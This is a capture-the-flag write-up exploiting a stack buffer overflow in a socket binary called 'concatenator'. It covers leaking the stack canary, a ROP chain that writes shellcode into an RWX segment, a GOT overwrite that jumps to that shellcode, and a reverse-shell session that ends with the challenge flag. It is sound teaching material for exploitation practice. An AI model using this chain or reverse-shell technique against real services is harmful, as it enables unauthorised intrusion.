# Solution

Binary is a self-contained socket app that joins strings together and prints the whole content to the screen. The core logic is in the `handle_request` function. Disassembly (with cosmetic changes to the original):
```c
void handle_request(int param_1)

{
  int size_num;
  size_t no_strlen;
  long in_FS_OFFSET;
  byte size;
  byte i;
  char strings_input [518];
  char size_str [2];
  long stack_chk;
  
  stack_chk = *(long *)(in_FS_OFFSET + 0x28);
  no_strlen = strlen("number of strings: ");
  write(param_1,"number of strings: ",no_strlen);
  read(param_1,size_str,2);
  size_num = atoi(size_str);
  size = (byte)size_num;
  if (0x10 < size) {
    size = 0x10;
  }
  for (i = 0; i < size; i = i + 1) {
    no_strlen = strlen("string: ");
    write(param_1,"string: ",no_strlen);
    read(param_1,strings_input + (long)(int)(uint)i * 0x20,0x400);
  }
  no_strlen = strlen("resulting string is: ");
  write(param_1,"resulting string is: ",no_strlen);
  for (i = 0; i < size; i = i + 1) {
    no_strlen = strlen(strings_input + (long)(int)(uint)i * 0x20);
    write(param_1,strings_input + (long)(int)(uint)i * 0x20,no_strlen - 1);
  }
  if (stack_chk != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Buffer overflow is obvious since `read` call is fixed with size `0x400` which is too large. The `strings_input` variable is of size 518. Therefore, we can control the `rip` register value but there are some security controls set for the binary:
```
pwndbg> checksec
[*] '/tmp/concatenator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We see that NX is enabled, but since the binary has RWX segments present we can easily plant our own shellcode at that memory address and reroute execution there. The arbitrary write primitive can be achieved with `read` call in the ROP chain.

The RWX segment is located at `0x404000`:
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r--p     1000 0      /tmp/concatenator
          0x401000           0x402000 r-xp     1000 1000   /tmp/concatenator
          0x402000           0x403000 r--p     1000 2000   /tmp/concatenator
          0x403000           0x404000 r--p     1000 2000   /tmp/concatenator
  ---->   0x404000           0x485000 rwxp    81000 3000   /tmp/concatenator     <----
          ...			...		...		...
```

## Bypassing stack canary

Stack canary can be simply bruteforced but there is also an easier way to bypass the canary protection. If we would analyse several stack canary values, we observe that most of the values end with a "\x00" byte:
```
pwndbg> i r rip
rip            0x4013fd            0x4013fd <handle_request+34>
pwndbg> i r rax
rax            0xf5d99e54e8062900  -731379376963835648
...
pwndbg> i r rax
rax            0x8dd431266667ed00  -8226896578302448384
...
pwndbg> i r rax
rax            0x137295e58c207400  1401347247196632064
...
pwndbg> i r rax
rax            0x32d78812deb65b00  3663546436516469504
```

This means that the `strlen(strings[i])-1` in the last `write` call will return a valid size of the string every time. Since we can overflow into the stack canary, we can overwrite the ending "\x00", byte effectively forcing `strlen(strings[i])-1` to return a larger size than the original string, therefore printing bytes after the last `strings` part. As a conclusion, we can leak the stack canary value with a single request:
```
$ nc localhost 9000
number of strings: 1
string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
resulting string is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
��^��0��,�
```

It is also possible that in some environments this would not work. In that case, the usual canary bruteforce approach must be taken.

## Setting up the chain - writing shellcode to RWX address

Planting our shellcode to the RWX address is easy:
- overflow to RIP
- overwrite return address to setup `read` parameters
- jump to `read`

In order for the `read` function to work, we have to setup our register as follows:
```
rdi = client socket file descriptor
rsi = 0x404000 (RWX address)
rdx = any integer value bigger than our shellcode
```

By observation of the assembly code for the `handle_request` function, we can see that both `rdi` and `rdx` is already setup upon leaving the function. The client socket file descriptor is set before entering the `handle_request` function and never changed. The size parameter for our `read` function (`rdx`) is set by the last `write` call in the `handle_request` function and its value depends on our input size which can be large as much as we want:
```
pwndbg> x/i $rip
=> 0x4015ac <handle_request+465>:	leave  
pwndbg> i r rdi rdx
rdi            0x4                 4
rdx            0x1                 1
```

Not we just have to setup the `rsi` register for which a ROP gadget exists:
```sh
$ ROPgadget --binary concatenator | grep rsi
0x00000000004015e6 : jmp qword ptr [rsi - 0x77]
0x0000000000401821 : pop rsi ; pop r15 ; ret
```

Therefore, the first few elements in our exploit are:
```
0x401821 // pop rsi; pop r15; ret
0x404000 // RWX addr
0x000000 // r15, does not matter
0x4011f4 // jump to read @plt (writes at RWX addr)
```

When this chain finishes, our shellcode is located at `0x404000` but we still need to find a way how to jump to it.

## Jumping to shellcode

To execute the RWX address, it is enough to specify 0x404000 as the next address and the binary will gladly jump to it. There are also other ways to jump to shellcode if this fails, such as using existing `jmp` instructions or utilizing the `.got` and `.plt` to "slingshot" towards the shellcode. Let's demonstrate these variants.

If we check available ROP gadgets, only `rax` and a few fixed address values can be used to jump:
```sh
$ ROPgadget --binary concatenator | grep ": jmp"
0x000000000040103a : jmp 0x401020
0x0000000000401374 : jmp 0x401300
0x0000000000401478 : jmp 0x4014e6
0x0000000000401533 : jmp 0x401588
0x00000000004017a3 : jmp 0x4016f9
0x0000000000401723 : jmp 0x4017a3
0x0000000000401788 : jmp 0x4017a8
0x000000000040100b : jmp 0x4840103f
0x00000000004015e6 : jmp qword ptr [rsi - 0x77]
0x00000000004012ec : jmp rax
```

Unfortunately, `rax` is not an option since no `pop rax` is present:
```sh
$ ROPgadget --binary concatenator | grep "pop" | grep "ax"
$
```

Nevermind! With `read` we can perform any write that we want and we can use any fixed value address that we want. My decision was to overwrite one of the functions in the `.got` table and use its `.plt` to jump to it. One thing to keep in mind with this approach is to pick a function that is far enough from `0x404000` since you might overwrite your own shellcode if a closer function is chosen.

To complete our exploit we perform another `read` call (`rdi` and `rdx` are already setup, remember?):
```
0x401821 // pop rsi; pop r15; ret
0x404080 // rsi, setvbuf @got
0x000000 // r15, does not matter
0x4011f4 // jump to read @plt (writes at setvbuf @got)
0x401234 // jump to setvbuf @plt (reads setvbuf @got)
```

Working exploit is in `solve.py`:
```sh
$ nc -nlvp 4444
Listening on 0.0.0.0 4444
^Z
[1]+  Stopped                 nc -nlvp 4444
$ python3 solve.py 
[+] Opening connection to localhost on port 9000: Done
[+] Receiving all data: Done (554B)
[*] Closed connection to localhost port 9000
found stack canary: b'\x00\xb02\xccmea{'
[+] Opening connection to localhost on port 9000: Done
[*] Closed connection to localhost port 9000
$ fg
nc -nlvp 4444
Connection received on 172.17.0.2 49840
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls
concatenator
flag.txt
cat flag.txt
ibctf{1f_th3_b1n4ry-1s-c04l_m1n1ng_-y0u-must-b3_c4rb0n_m0n0x1d3}
```

